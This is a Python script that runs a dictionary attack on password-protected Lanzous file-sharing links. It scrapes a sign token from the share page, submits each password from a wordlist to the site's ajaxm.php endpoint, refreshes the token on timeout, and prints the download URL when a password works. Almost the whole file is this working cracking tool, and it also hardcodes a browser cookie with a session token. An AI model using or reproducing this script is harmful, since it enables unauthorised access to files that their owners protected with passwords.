import requests
import urllib.request
from urllib import request
from bs4 import BeautifulSoup
import re
import json
import time
from requests_toolbelt import MultipartEncoder
def tjpass(url1,sign,p):		#提交密码
	url='https://www.lanzous.com/ajaxm.php'
	header = {
		'authority':'www.lanzous.com',
		'method':'POST',
		'path':'/ajaxm.php',
		'scheme':'https',
		'accept':'application/json, text/javascript, */*',
		'accept-encoding':'gzip, deflate, br',
		'accept-language':'zh-CN,zh;q=0.9',
		'content-length':'110',
		'content-type':'application/x-www-form-urlencoded',
		'cookie':'UM_distinctid=1697726f0eb274-0dd9a4049d8a63-3c604504-1aeaa0-1697726f0ec696; CNZZDATA5288474=cnzz_eid%3D328552057-1553511657-%26ntime%3D1553571101; noads=1; pc_ad1=1; CNZZDATA5289133=cnzz_eid%3D871630798-1555993933-https%253A%252F%252Fwww.xd0.com%252F%26ntime%3D1560488105; CNZZDATA1253610888=1307962393-1552477243-%7C1560488668; sec_tc=AQAAABzPaxPoNgkAalZQosFcLyd74xrs',
		'origin':'https://www.lanzous.com',
		'referer':url1,
		'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
		'x-requested-with':'XMLHttpRequest',
		}
	postdata={
		'action':'downprocess',	
		'sign':sign,	
		'p':p,
		}
	r = requests.post(url, data=postdata,headers=header)
	jieguo = r.json()
	if(jieguo['inf']=="密码不正确"):
		return 0
	elif(jieguo['inf']=="已超时，请刷新"):
		return 2
	else:
		return jieguo
def hqsrc(url):		
	url1=url
	header = {"Content-type": "application/x-www-form-urlencoded",
			   'Accept-Language':'zh-CN,zh;q=0.8',
			   'User-Agent': "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0",
			   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			   "Connection": "close",
			   "Cache-Control": "no-cache"}
	request = urllib.request.Request(url=url1,headers=header)
	resp =urllib.request.urlopen(request)
	html=resp.read()
	soup = BeautifulSoup(html,'html.parser',from_encoding='UTF8');
	res = str(soup.find_all('script'))
	result = re.findall(".*&sign=(.*)&p.*",res)	#获取sign值
	return result[0]
def startpj():
	global pjurl
	global yctime
	global pjtext
	url=pjurl		#在这里修改破解地址
	sign=hqsrc(url)
	file=open(pjtext)
	for line in file.readlines():
		line=line.replace(' ','').replace('\n','')
		jieguo = tjpass(url,sign,line)
		time.sleep(int(yctime))
		if(jieguo==2):
			sign=hqsrc(url)
		elif(jieguo==0):
			print(line+"错误")
		else:
			print("成功破解，下载地址："+jieguo['dom']+"/"+jieguo['url'])
pjurl = input("输入破解地址：")
yctime = input("输入延迟时间：")
pjtext=input("输入字典文件名：")
startpj()